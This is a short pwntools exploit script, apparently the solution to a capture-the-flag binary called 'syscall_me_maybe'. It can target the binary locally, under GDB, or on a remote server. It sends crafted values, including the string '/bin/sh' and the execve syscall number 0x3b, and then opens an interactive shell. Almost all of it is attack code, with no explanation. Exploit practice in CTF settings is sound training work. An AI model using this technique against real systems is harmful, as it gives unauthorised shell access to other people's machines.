from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *0x40103a
continue
'''.format(**locals())

exe = './challenge/syscall_me_maybe'
elf = context.binary = ELF(exe, checksec=False)
p = start()

p.send(p64(0))
p.send(b'/bin/sh\x00')
p.send(p64(0))
p.send(p64(0x3b))

p.interactive()
